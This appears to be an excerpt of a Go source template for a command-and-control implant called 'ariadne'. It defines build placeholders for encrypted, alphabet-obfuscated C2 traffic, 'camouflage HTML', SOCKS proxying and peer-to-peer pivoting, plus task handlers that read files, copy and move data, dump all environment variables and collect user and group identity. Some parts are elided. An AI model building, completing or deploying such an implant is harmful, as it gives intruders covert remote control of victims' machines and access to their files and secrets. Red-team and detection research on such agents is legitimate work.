...
const (
	ariadneUUID             = `%UUID%`
	ariadneAuthMethod       = `%AUTH_METHOD%`
	ariadneAuthName         = `%AUTH_NAME%`
	ariadneAuthValue        = `%AUTH_VALUE%`
	ariadneEncoding         = `%ENCODING%`
	ariadneDeformedAlphabet = `%DEFORMED_ALPHABET%`
	ariadneStandardAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	ariadneEncryption       = `%ENCRYPTION%`
	ariadneAESKey           = `%AES_KEY%`
	ariadneRequestTemplate  = `%REQUEST_TEMPLATE%`
	ariadneRequestParam     = `%REQUEST_PARAM_NAME%`
	ariadneResponseCT       = `%RESPONSE_CONTENT_TYPE%`
)

var ariadneCamouflageHTML = `%CAMOUFLAGE_HTML%`

const (
	ariadneResponseStatus = %RESPONSE_STATUS_CODE%
	ariadneEnableSOCKS    = %ENABLE_SOCKS%
	ariadneEnableP2PHTTP  = %ENABLE_P2P_HTTP%
	ariadneEnableP2PTCP   = %ENABLE_P2P_TCP%
	ariadneTCPPort        = %TCP_PORT%
	ariadneDebug          = %DEBUG%
)
...
[% if 'cat' in commands %]
func cmdCat(taskID, filePath string) string {
	contents, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Sprintf("1|%s|Failed to read file: %s", taskID, err.Error())
	}

	return fmt.Sprintf("0|%s|%s", taskID, string(contents))
}
[% endif %]

[% if 'mkdir' in commands %]
func cmdMkdir(taskID, path string) string {
	info, err := os.Stat(path)
	if err == nil && info.IsDir() {
		return fmt.Sprintf("0|%s|Directory already exists: %s", taskID, path)
	}

	if err := os.MkdirAll(path, 0755); err != nil {
		return fmt.Sprintf("1|%s|Failed to create directory: %s", taskID, err.Error())
	}

	return fmt.Sprintf("0|%s|Created directory: %s", taskID, path)
}
[% endif %]

[% if 'cp' in commands %]
func cmdCp(taskID, src, dst string) string {
	srcInfo, err := os.Stat(src)
	if err != nil {
		return fmt.Sprintf("1|%s|Source not found: %s", taskID, src)
	}

	if srcInfo.IsDir() {
		if err := copyDirRecursive(src, dst); err != nil {
			return fmt.Sprintf("1|%s|Failed to copy directory: %s -> %s - %s", taskID, src, dst, err.Error())
		}
		return fmt.Sprintf("0|%s|Copied: %s -> %s", taskID, src, dst)
	}

	data, err := os.ReadFile(src)
	if err != nil {
		return fmt.Sprintf("1|%s|Failed to read source: %s", taskID, err.Error())
	}

	if err := os.WriteFile(dst, data, srcInfo.Mode()); err != nil {
		return fmt.Sprintf("1|%s|Failed to write destination: %s", taskID, err.Error())
	}
...
[% if 'mv' in commands %]
func cmdMv(taskID, src, dst string) string {
	if _, err := os.Stat(src); os.IsNotExist(err) {
		return fmt.Sprintf("1|%s|Source not found: %s", taskID, src)
	}

	if err := os.Rename(src, dst); err != nil {
		return fmt.Sprintf("1|%s|Failed to move: %s -> %s - %s", taskID, src, dst, err.Error())
	}

	return fmt.Sprintf("0|%s|Moved: %s -> %s", taskID, src, dst)
}
[% endif %]
...
[% if 'env' in commands %]
func cmdEnv(taskID string) string {
	return fmt.Sprintf("0|%s|%s", taskID, strings.Join(os.Environ(), "\n"))
}
[% endif %]

[% if 'whoami' in commands %]
func cmdWhoami(taskID string) string {
	...
	if err == nil {
		...
		sb.WriteString("Home: " + u.HomeDir + "\n")

		groups, err := u.GroupIds()
		if err == nil && len(groups) > 0 {
			sb.WriteString("Groups: " + strings.Join(groups, ", ") + "\n")
		}
	} else {
		sb.WriteString("User: unknown\n")
	}

	if runtime.GOOS != "windows" {
		out, err := exec.Command("/bin/sh", "-c", "id").CombinedOutput()
		if err == nil {
			sb.WriteString(strings.TrimRight(string(out), "\r\n"))
		}
	}

	return fmt.Sprintf("0|%s|%s", taskID, strings.TrimRight(sb.String(), "\r\n"))
}
[% endif %]

[% if 'ps' in commands %]
func cmdPs(taskID string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
